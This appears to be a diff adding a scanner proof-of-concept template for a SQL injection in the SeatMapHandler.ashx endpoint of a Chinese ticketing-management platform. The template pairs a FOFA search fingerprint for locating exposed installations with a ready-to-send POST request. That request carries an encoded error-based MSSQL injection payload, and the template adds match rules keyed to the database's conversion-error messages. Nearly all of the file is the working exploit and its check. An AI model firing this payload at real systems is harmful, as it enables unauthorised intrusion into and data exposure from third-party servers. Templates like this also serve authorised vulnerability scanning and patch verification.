@@ -1,0 +1,18 @@
+id: poc-yaml-zckx-seatmaphandler-ashx-sqli
+info:
+  name: 中城科信票务管理平台 SeatMapHandler.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 中城科信票务管理平台
+  fofa: body="SystemManager/SoftwareLicense.htm"
+requests:
+- method: POST
+  path: /SystemManager/Comm/SeatMapHandler.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
+  expression: status_code == 200 && contains(body,"在将 varchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"Error:命名空间") && !contains(body,"<")
+variables: {}
+transport: http
